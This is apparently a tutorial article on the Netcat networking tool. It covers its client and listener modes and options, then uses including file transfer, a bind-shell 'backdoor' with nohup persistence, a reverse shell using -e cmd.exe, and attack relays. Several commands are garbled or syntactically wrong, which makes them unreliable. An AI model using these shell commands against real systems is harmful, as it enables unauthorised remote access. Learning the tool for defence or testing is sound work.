Netcat is one of the most common tools used by hackers to exploit systems. It runs on a variety of systems including Windows, Linux, Solaris, etc.
Netcat comes installed in most Linux distributions. Before we dig deeper into the famous uses of Netcat.
Netcat Modes:

Netcat can operate in 2 modes:

    Client Mode: The client always initiates the connection with the listener. All the errors in client mode are put into the standard error. In client mode, it requires the IP address and port of the listener.
    Listener Mode: In this mode, the listener always listens for the connection on a specific port. Its output can be a standard output, file etc. It asks for just listening port.

Netcat Command Options

    Netcat works with several options. However, the following is a common Netcat syntax:

    nc [options] [target_system] [remote port]

    These are the main options in Netcat:

        -l: This option tells the Netcat to be in listen mode
        -u: This shifts Netcat from TCP(default) to UDP mode
        -p: For the listener, this is the listened port. For the client, this is source port.
        -e: This is a very useful option. This tells what operation to perform after a successful connection.
        -L: This makes a persistent listener. Work for Windows only
        -wN: This option defines the timeout value. For example, w indicates to wait for 5 seconds before timeout.
        -v: This is the verbose mode.

        Netcat Uses

      Now that we have a clear idea of Netcat syntax, let’s focus on the main subject of this article – use cases.

          Data Transfer

          Netcat can be used to transfer files between machines. Netcat works with both TCP and UDP. Data transfer can be done in two ways:
              Pulling a file from Listener from client. In this type of transfer, the file is actually pulled from a listener. Below commands will do that
                  At listener: nc –l –p 6789 < test.txt
                  At Client: nc 127.0.0.1 6789 > test.txt
              Pushing a file to Listener from client: This includes pushing a file to the listener from the client
                  Create a file: echo testing > testPush.txt
                  At listener: nc –l –p 4321 > gotit.txt
                  At client: nc –l –p 4321 <textPush.txt
                  At listener : type gotit.txt
              Create a backdoor

          Netcat’s most popular use by malicious users is to create a backdoor login shell. This simple script below will create a backdoor.
              At listener: nc –l –p 1234 –e cmd.exe
              At client: nc 127.0.0.1 1234

          Note that –e is being used to execute the action after the connection is being established. Also in Linux, these backdoors can be made persistent which means even after the current user logged out, the backdoor will keep running in background. This can be achieved with the usage of the nohup command. First, the whole code can be dumped into a file and permissions will be changed to readable and writable so that it can be executed as a script, such as the example below:
              Chmod 555 .sh
              nohup ./.sh &
              Reverse Shells

          Netcat can also be used to push a client session from the client to the server. This technique is called a reverse shell and can be achieved with following commands
              At listener: nc –l –p 1234
              At client: nc 127.0.0.1 1234 –e cmd.exe
              Relays

          Netcat can be configured to bounce an attack from machine to machine. Below is the command that can be used specify to the number of relays required.
              Nc –l –l | nc

Netcat can be created by several ways. The most popular method is creating batch files in Windows, and FIFO in Unix and Linux. Let’s discuss these approaches below:

        Windows: Create a batch with content “nc ” and save it as relay.bat. Then the relay can be created by running the below command
            Nc – l –p -e relay.bat
        Linux/Unix: In Linux relays are invoked using special file type(FIFO) named backpipe. This helps in creating a FIFO to move the data back and forth on the command line. It can be invoked using below syntax
            mknod backpipe p
            Relay is invoked by: nc-l –p 0 1>backpipe
